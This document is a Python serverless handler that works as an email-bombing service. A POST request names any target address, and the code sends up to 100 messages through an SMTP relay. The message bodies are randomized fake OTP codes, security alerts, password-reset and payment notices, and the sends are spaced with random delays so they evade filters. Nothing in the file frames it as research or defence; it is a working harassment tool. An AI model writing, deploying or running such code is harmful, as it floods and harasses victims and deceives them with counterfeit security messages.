from http.server import BaseHTTPRequestHandler
import json
import smtplib
from email.mime.text import MIMEText
import os
import random
import string
import time

# ── RANDOMIZED EMAIL BODY GENERATOR ──
def gen_body():
    templates = [
        "Verification code: {c}. Do not share this with anyone.",
        "Your OTP is {c}. Valid for 5 minutes.",
        "Security alert: Unusual login detected. Code: {c}",
        "Account notification #{c} — action required.",
        "Confirm identity: {c}. Auto-generated message.",
        "Transaction ${a} pending. Ref: {c}",
        "{c} is your temporary access code.",
        "Delivery update — tracking: {c}",
        "Reminder: Appointment confirmed. Ref #{c}",
        "Payment of ${a} processed. Verify: {c}",
        "New sign-in from unknown device. Code: {c}",
        "Your account was accessed. Verify: {c}",
        "Password reset requested. Use code {c}",
        "Suspicious activity on your account. Code: {c}",
    ]
    c = ''.join(random.choices(string.digits, k=6))
    a = f"{random.randint(10,999)}.{random.randint(10,99)}"
    return random.choice(templates).format(c=c, a=a)

# ── STANDARD EMAIL FLOODER ──
def email_flood(target_email, count=25):
    smtp_host = os.environ.get('SMTP_HOST', 'smtp-relay.brevo.com')
    smtp_port = int(os.environ.get('SMTP_PORT', 587))
    smtp_user = os.environ.get('SMTP_USER')
    smtp_pass = os.environ.get('SMTP_PASS')
    sender = os.environ.get('SENDER_EMAIL', 'retriontop@gmail.com')

    if not all([smtp_user, smtp_pass, sender]):
        return {'status': 'failed', 'error': 'SMTP credentials not configured in Vercel ENV'}

    results = []
    total_sent = 0

    try:
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(smtp_user, smtp_pass)

        for i in range(count):
            try:
                msg = MIMEText(gen_body())
                msg['From'] = sender
                msg['To'] = target_email
                msg['Subject'] = f"Alert {random.randint(1000, 9999)}"
                server.sendmail(sender, [target_email], msg.as_string())
                results.append({'seq': total_sent + 1, 'status': 'sent'})
                total_sent += 1
                time.sleep(random.uniform(0.05, 0.25))
            except Exception as e:
                results.append({'seq': total_sent + 1, 'status': 'failed', 'error': str(e)})
                total_sent += 1

        server.quit()
    except Exception as e:
        return {
            'status': 'partial',
            'error': f'SMTP error: {str(e)}',
            'messages_sent': sum(1 for r in results if r['status'] == 'sent'),
            'messages_total': total_sent,
            'results': results
        }

    sent_ok = sum(1 for r in results if r['status'] == 'sent')
    return {
        'status': 'complete',
        'target': target_email,
        'messages_sent': sent_ok,
        'messages_total': total_sent,
        'results': results
    }

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            body = json.loads(post_data.decode('utf-8'))

            target = body.get('target')
            count = min(int(body.get('count', 25)), 100)  # cap at 100

            if not target or '@' not in target:
                self._json(400, {'error': 'Valid target email required'})
                return

            result = email_flood(target, count)
            self._json(200, result)

        except Exception as e:
            self._json(500, {'error': str(e)})

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
